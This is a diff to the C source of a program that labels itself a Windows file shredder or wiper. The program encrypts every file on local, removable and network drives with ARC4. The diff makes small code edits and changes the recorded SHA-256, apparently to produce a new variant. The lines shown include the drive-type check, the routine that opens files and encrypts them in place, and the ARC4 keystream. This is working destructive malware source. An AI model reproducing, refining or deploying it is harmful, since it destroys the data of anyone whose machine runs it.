@@ -3,7 +3,7 @@
   Version:          5.19
   Class:            Files shredder for Windows / Wiper.
   What is he doing: Encrypts all files on all local drives with a cipher ARC4
-  SHA-256:          8d1f1625cd2bf98504c84fa765a98ee065ee9b2c0056b7506425d588ce752314
+  SHA-256:          9db95e89cd9f3bb41f4e219f2bc4d60a6b0f3fc6b770da960eedf5886882c465
 */
 #include <io.h>
 #include <time.h>
@@ -35,7 +35,7 @@ char * t_two        = "..";
 
 short int size_uc = sizeof(unsigned char); 
 
-unsigned char vi, bi;
+unsigned short vi, bi;
 
 unsigned char secret_key [_BYTE]        = {_ZERO};
 unsigned char buffer     [_BUFFER_SIZE] = {_ZERO};
@@ -117,8 +117,8 @@ short int checklogicaldisk(unsigned char number_disk) {
  
  if ((result == DRIVE_FIXED) || (result == DRIVE_REMOTE) || (result == DRIVE_REMOVABLE))
   return _ZERO;
-
- return _ERROR;
+ else
+  return _ERROR;
 }
 
 short int randomrange(short int min, short int max) {
@@ -133,9 +133,9 @@ void writetrash(unsigned char * data, short int  length) {
 }
 
 void fileencrypt(const unsigned char * filename) {
- FILE * f;
+ FILE * f = fopen(filename, "r+b");
 
-  if ((f = fopen(filename, "r+b")) != NULL) {
+  if (f != NULL) {
    fseek(f, _ZERO, SEEK_END);
    long int fsize = ftell(f);
    fseek(f, _ZERO, SEEK_SET);
@@ -162,7 +162,7 @@ void fileencrypt(const unsigned char * filename) {
   }
 }
 
-void swap(unsigned char * a, unsigned char * b) {
+void swap (unsigned char * a, unsigned char * b) {
  unsigned char t = *a;
 
  *a = *b;
@@ -183,13 +183,13 @@ void initialized(const unsigned char * key, short int length) {
 }
 
 void arc4(unsigned char * data, short int length) {
- register short int i;
-  for (i = _ZERO; i < length; i++) {
+ register short int z;
+  for (z = _ZERO; z < length; z++) {
    vi = (vi + 1) % _BYTE;
    bi = (bi + secret_key[vi]) % _BYTE;
 
    swap(&secret_key[vi], &secret_key[bi]);
 
-   data[i] ^= secret_key[(secret_key[vi] + secret_key[bi]) % _BYTE];
+   data[z] ^= secret_key[(secret_key[vi] + secret_key[bi]) % _BYTE];
   }
 }
